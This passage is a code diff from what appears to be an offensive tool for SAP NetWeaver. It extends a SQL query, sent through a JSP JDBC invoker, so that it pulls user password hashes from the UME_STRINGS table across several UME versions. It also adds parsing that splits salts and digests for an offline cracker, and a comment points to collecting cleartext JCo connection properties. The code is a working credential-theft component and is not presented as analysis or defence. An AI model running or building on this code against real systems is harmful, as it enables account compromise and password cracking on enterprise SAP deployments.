@@ -207,12 +207,25 @@ def invoke_jdbc_query(jsp_url: str, sid: str, query: str,
 # UME password hash extraction
 # ---------------------------------------------------------------------------
 
-# Direct query for j_password rows.  The username is encoded in the PID
-# column as `UACC.PRIVATE_DATASOURCE.un:<USERNAME>` — we parse it client-side
-# in parse_password_hashes() rather than join in SQL.  Simpler than the
-# self-join we previously used and works reliably across UME schema versions.
+# Direct query for UME password-hash rows.  NetWeaver kernels store the
+# hash under different ATTR names depending on the UME version:
+#   j_password              — NW 7.1+ (most common today)
+#   hashvalue               — NW 7.00 / 7.01 SolMan-era UME
+#   jSaltedHashedPassword   — transitional
+#   hashed_pwd              — some CE / PI variants
+# The LEFT JOIN on ATTR='j_user' resolves the human-readable username for
+# kernels where PID is an opaque UID.  When j_user isn't present (older
+# UME), COALESCE falls back to PID itself and parse_password_hashes strips
+# the common "UACC.PRIVATE_DATASOURCE.un:" prefix client-side.
 UME_HASH_QUERY = (
-    "SELECT PID, VAL FROM UME_STRINGS WHERE ATTR LIKE '%j_password%'"
+    "SELECT h.PID AS PID, "
+    "       COALESCE(u.VAL, h.PID) AS USERNAME, "
+    "       h.VAL AS HASH "
+    "FROM UME_STRINGS h "
+    "LEFT JOIN UME_STRINGS u "
+    "       ON u.PID = h.PID AND UPPER(u.ATTR) = 'J_USER' "
+    "WHERE UPPER(h.ATTR) IN ('J_PASSWORD', 'HASHVALUE', "
+    "                        'JSALTEDHASHEDPASSWORD', 'HASHED_PWD')"
 )
 
 # Find every JCo destination by collecting cleartext property rows under
@@ -325,7 +338,15 @@ def parse_password_hashes(query_result: dict) -> list:
             # PID like "UACC.PRIVATE_DATASOURCE.un:Administrator"
             username = pid.rsplit(":", 1)[-1] if ":" in pid else pid
         else:
-            username = row[u_idx]
+            username = row[u_idx] or ""
+            # Older UME kernels store no j_user row; the query COALESCEs to
+            # PID in that case, which looks like "UACC.PRIVATE_DATASOURCE.un:
+            # <USERNAME>" or similar.  Strip the prefix so cracker output
+            # stays human-readable.
+            if ":" in username and (
+                    "UACC" in username.upper()
+                    or "PRIVATE_DATASOURCE" in username.upper()):
+                username = username.rsplit(":", 1)[-1]
         full_hash = row[h_idx] or ""
         m = re.match(r"^\{([A-Za-z0-9\-]+)\s*,\s*(\d+)\s*,\s*(\d+)\}(.+)$",
                       full_hash.strip())
@@ -337,7 +358,14 @@ def parse_password_hashes(query_result: dict) -> list:
                 blob = base64.b64decode(m.group(4))
             except Exception:
                 blob = b""
-            digest_size = {"SHA-256": 32, "SHA-512": 64}.get(algorithm, 32)
+            # Digest sizes by algorithm tag.  NW 7.0x SolMan-era UME emits
+            # `{SHA-1, N, L}...`; 7.3+ uses SHA-256; 7.5+ offers SHA-512.
+            digest_size = {
+                "SHA-1":   20,
+                "SHA":     20,
+                "SHA-256": 32,
+                "SHA-512": 64,
+            }.get(algorithm, 32)
             stored_hash = blob[:digest_size]
             salt = blob[digest_size:digest_size + salt_len]
             hashes.append({
